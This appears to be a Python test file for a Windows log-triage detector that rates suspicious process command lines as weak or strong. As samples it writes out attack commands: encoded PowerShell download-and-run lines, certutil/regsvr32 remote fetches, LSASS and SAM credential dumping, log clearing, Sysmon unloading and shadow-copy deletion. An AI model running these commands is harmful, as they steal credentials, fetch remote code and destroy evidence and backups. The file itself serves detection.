"""Command lines: PowerShell (also when encoded) and the rule lists for Windows tools.
Every name here is made up (SRV-01, analyst, example domains)."""

import base64

from tests.fixtures.events import USER, event
from tests.helpers import SYS, PS, strengths
from triage.checks import run_checks


def encoded(script):
    """A PowerShell -EncodedCommand line for this script (base64 of UTF-16 text), as PowerShell writes it."""
    return "powershell -NoProfile -EncodedCommand " + base64.b64encode(script.encode("utf-16-le")).decode()


# ---------- PowerShell ----------

def powershell_strengths(command, parent=USER + "\\Downloads\\invoice_viewer.exe"):
    """The strengths of the PowerShell findings for one command line, started by parent
    (by default a program in Downloads, which is not an admin tool)."""
    events = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{ps}", ParentProcessGuid="{parent}",
                    Image=PS, ParentImage=parent, CommandLine=command)]
    return [f["strength"] for f in run_checks(events) if f["check"] == "suspicious_powershell"]


def test_hidden_or_encoded_powershell_alone_is_not_suspicious():
    # Agents use these options all day; on their own they would bury the real signals.
    assert powershell_strengths("powershell.exe -NoProfile -WindowStyle Hidden -File "
                                "C:\\Program Files\\Agent\\inventory.ps1") == []
    # A monitoring agent's encoded command that only reads a counter.
    assert powershell_strengths(encoded("Get-Counter '\\Processor(_Total)\\% Processor Time'")) == []
    assert powershell_strengths("powershell -ep bypass -File C:\\Scripts\\a.ps1") == []


def test_powershell_download_and_run_is_strong():
    download_and_run = "iex (New-Object Net.WebClient).DownloadString('http://x.example/a')"
    assert powershell_strengths("powershell -c " + download_and_run) == ["Strong"]
    assert powershell_strengths(encoded(download_and_run)) == ["Strong"]       # same, hidden by encoding
    assert powershell_strengths(encoded("iex ([Text.Encoding]::UTF8.GetString("
                                        "[Convert]::FromBase64String($b)))")) == ["Strong"]
    # Dual-use: the same line from an installed management agent, with nothing else, is Low.
    agent = "C:\\Program Files\\Agent\\agent.exe"
    assert powershell_strengths("powershell -c " + download_and_run, parent=agent) == ["Weak"]


def test_powershell_download_only_is_weak():
    assert powershell_strengths(encoded("iwr http://x.example/readme.txt -OutFile $env:TEMP\\r.txt")) == ["Weak"]
    assert powershell_strengths("powershell -c iex $code") == ["Weak"]
    finding = run_checks([event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{ps}", Image=PS,
                                CommandLine=encoded("iwr http://x.example/a"))])[0]
    assert finding["detail"] == "decoded command: iwr http://x.example/a"  # the analyst sees what it does


def ps_strength(script):
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS, ParentProcessGuid="{d}",
                    ParentImage=USER + "\\Downloads\\helper.exe", CommandLine="powershell -c " + script)]
    return strengths(events, "suspicious_powershell")


def test_powershell_curl_and_wget_count_as_downloads():
    assert ps_strength("curl https://x.example/a.txt -OutFile a.txt") == ["Weak"]
    assert ps_strength("iex (wget https://x.example/a.ps1).Content") == ["Strong"]


def test_official_package_manager_installers_are_low():
    choco = ("iex ((New-Object System.Net.WebClient).DownloadString("
             "'https://community.chocolatey.org/install.ps1'))")
    assert ps_strength(choco) == ["Weak"]
    assert ps_strength("irm get.scoop.sh | iex") == ["Weak"]
    assert ps_strength("irm https://scoop.example.net/x | iex") == ["Strong"]   # any other source


# ---------- encoding does not hide a command from the rule lists ----------

def test_encoded_shadow_copy_deletion_is_strong():
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS,
                    CommandLine=encoded("vssadmin delete shadows /all /quiet"))]
    findings = [f for f in run_checks(events) if f["check"] == "evidence_removal"]
    assert [f["strength"] for f in findings] == ["Strong"]
    assert "decoded command: vssadmin delete shadows" in findings[0]["detail"]


def test_encoded_new_account_is_found_with_the_password_hidden():
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS,
                    CommandLine=encoded("net user bob Winter2026! /add"))]
    findings = run_checks(events)
    assert [f["check"] for f in findings] == ["access_change"]
    assert "Winter2026!" not in findings[0]["detail"]


# ---------- rule lists for Windows tools ----------

def command_findings(image, command):
    """(check, strength) of every finding for one program run with this command line."""
    events = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{c}", Image=image, CommandLine=command,
                    ParentImage="C:\\Windows\\System32\\cmd.exe")]
    return [(f["check"], f["strength"]) for f in run_checks(events)]


def test_remote_execution_is_weak():
    fires = [("C:\\Tools\\PsExec64.exe", '"C:\\Tools\\PsExec64.exe" \\\\SRV-01 -s cmd /c ipconfig'),
             (SYS + "wbem\\WMIC.exe", 'wmic /node:SRV-01 process call create "cmd /c calc"'),
             (SYS + "winrs.exe", "winrs -r:SRV-01 cmd"),
             (SYS + "sc.exe", "sc \\\\SRV-01 create upd binPath= C:\\x.exe"),
             (SYS + "xcopy.exe", "xcopy /Y C:\\Tools\\a.exe \\\\SRV-01\\C$\\Windows\\Temp\\"),
             (SYS + "net.exe", "net use \\\\SRV-01\\ADMIN$ /user:corp\\admin"),
             (SYS + "WindowsPowerShell\\v1.0\\powershell.exe", "powershell Invoke-Command -ComputerName SRV-01 {hostname}")]
    for image, command in fires:
        assert ("remote_execution", "Weak") in command_findings(image, command), command
    quiet = [(SYS + "wbem\\WMIC.exe", "wmic process list brief"),          # WMI on this computer
             (SYS + "net.exe", "net use Z: \\\\FILES-01\\Shared"),          # a normal file share
             (SYS + "robocopy.exe", "robocopy E:\\Export \\\\BACKUP-01\\Backups$ /MIR")]  # not an admin share
    for image, command in quiet:
        assert "remote_execution" not in [c for c, _ in command_findings(image, command)], command


def test_access_changes_are_weak():
    fires = [(SYS + "net.exe", "net user helpdesk **** /add"),
             (SYS + "net1.exe", 'net1 localgroup "Administrators" helpdesk /add'),
             (SYS + "net.exe", 'net group "Domain Admins" helpdesk /add /domain'),
             (SYS + "netsh.exe", 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes')]
    for image, command in fires:
        assert ("access_change", "Weak") in command_findings(image, command), command
    quiet = [(SYS + "net.exe", "net user helpdesk"),                       # only looks at an account
             (SYS + "net.exe", 'net localgroup "Administrators"'),          # only lists the group
             (SYS + "netsh.exe", "netsh advfirewall show allprofiles")]     # only reads the firewall
    for image, command in quiet:
        assert command_findings(image, command) == [], command


def test_scheduled_task_and_windows_tool_downloads_are_weak():
    assert ("scheduled_task", "Weak") in command_findings(
        SYS + "schtasks.exe", 'schtasks /create /tn "Update" /tr C:\\x.exe /sc daily')
    assert command_findings(SYS + "schtasks.exe", "schtasks /query /fo list") == []
    downloads = [(SYS + "certutil.exe", "certutil -urlcache -split -f http://x.example/a.dat a.dat"),
                 (SYS + "certutil.exe", "certutil -decode in.txt out.exe"),
                 (SYS + "bitsadmin.exe", "bitsadmin /transfer job http://x.example/a.exe C:\\a.exe"),
                 (SYS + "mshta.exe", "mshta http://x.example/page.hta"),
                 (SYS + "regsvr32.exe", "regsvr32 /s /u /i:http://x.example/a.sct scrobj.dll")]
    for image, command in downloads:
        assert ("tool_download", "Weak") in command_findings(image, command), command
    # curl is a real download tool; certutil reading a certificate is normal.
    assert command_findings("C:\\Windows\\System32\\curl.exe", "curl -L -o gh.zip https://example.com/gh.zip") == []
    assert command_findings(SYS + "certutil.exe", "certutil -dump cert.cer") == []


def test_dll_from_a_user_folder_is_weak():
    dll = "C:\\Users\\analyst\\AppData\\Roaming\\Tool\\update.dll"
    assert ("dll_from_user_folder", "Weak") in command_findings(SYS + "rundll32.exe", f"rundll32.exe {dll},Start")
    assert command_findings(SYS + "rundll32.exe", "rundll32.exe C:\\Windows\\System32\\shell32.dll,"
                                                  "Control_RunDLL desk.cpl") == []


def test_credential_theft_is_strong():
    chrome_store = "C:\\Users\\analyst\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    fires = [(SYS + "esentutl.exe", f'esentutl.exe /y "{chrome_store}" /d C:\\Users\\Public\\ld.tmp'),
             (SYS + "rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\d.dmp full"),
             ("C:\\Tools\\procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe out.dmp"),
             (SYS + "reg.exe", "reg save HKLM\\SAM C:\\Users\\Public\\sam.hiv"),
             (SYS + "ntdsutil.exe", 'ntdsutil "ac i ntds" "ifm" "create full C:\\x" q q')]
    for image, command in fires:
        assert ("credential_theft", "Strong") in command_findings(image, command), command
    # Chrome opening its own profile, and reading a normal registry key, are not theft.
    chrome = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
    assert command_findings(chrome, f'chrome.exe --user-data-dir="{chrome_store}"') == []
    assert command_findings(SYS + "reg.exe", "reg query HKLM\\SOFTWARE\\Microsoft") == []


def test_evidence_removal_is_strong():
    fires = [(SYS + "wevtutil.exe", "wevtutil cl System"),
             (SYS + "fltMC.exe", "fltMC unload SysmonDrv"),
             (SYS + "sc.exe", "sc stop Sysmon64"),
             (SYS + "vssadmin.exe", "vssadmin delete shadows /all /quiet"),
             (SYS + "wbem\\WMIC.exe", "wmic shadowcopy delete"),
             (SYS + "bcdedit.exe", "bcdedit /set {default} recoveryenabled No")]
    for image, command in fires:
        assert ("evidence_removal", "Strong") in command_findings(image, command), command
    # Reading a log, and creating a shadow copy (a backup), are normal.
    assert command_findings(SYS + "wevtutil.exe", "wevtutil qe System /c:5") == []
    assert command_findings(SYS + "vssadmin.exe", "vssadmin create shadow /for=E:") == []


def test_command_line_findings_carry_the_rule_tag():
    events = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{w}", Image=SYS + "wbem\\WMIC.exe",
                    CommandLine='wmic /node:SRV-01 process call create "cmd"')]
    finding = run_checks(events)[0]
    assert (finding["tactic"], finding["technique"]) == ("Execution", "T1047 Windows Management Instrumentation")
